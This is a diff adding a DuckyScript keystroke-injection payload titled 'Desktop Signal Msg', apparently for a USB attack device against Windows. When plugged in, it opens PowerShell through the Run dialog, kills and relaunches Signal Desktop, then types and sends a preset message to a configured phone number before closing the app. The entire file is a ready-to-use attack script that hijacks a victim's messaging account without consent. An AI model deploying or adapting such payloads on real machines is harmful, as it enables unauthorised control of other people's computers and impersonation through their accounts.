@@ -1,0 +1,51 @@
+REM #########################################
+REM #                                       |
+REM # Title        : Desktop Signal Msg     |
+REM # Author       : magikh0e               |
+REM # Version      : 1.0                    |
+REM # Category     : Execution              | 
+REM # Target       : Windows        |
+REM #                                       |
+REM #########################################
+
+REM Requirements:
+REM   - Internet Connection
+REM   - Signal Desktop App installed
+REM Payload Plug-And-Play 
+
+REM REQUIRED - Receiver number
+DEFINE NUMBER 5552211000
+
+REM REQUIRED - Message to send
+DEFINE MESSAGE YOUR_MESSAGE
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Stop-Process -Name "Signal"
+ENTER
+STRING Start-Process $Env:USERPROFILE\AppData\Local\Programs\signal-desktop\Signal.exe; exit
+ENTER
+DELAY 5000
+TAB
+TAB
+TAB
+ENTER
+DELAY 100
+STRING NUMBER
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 200
+
+REM This is the message that will be sent.
+STRING YOUR_MESSAGE
+ENTER
+
+REM Closing Signal App
+DELAY 500
+ALT F4
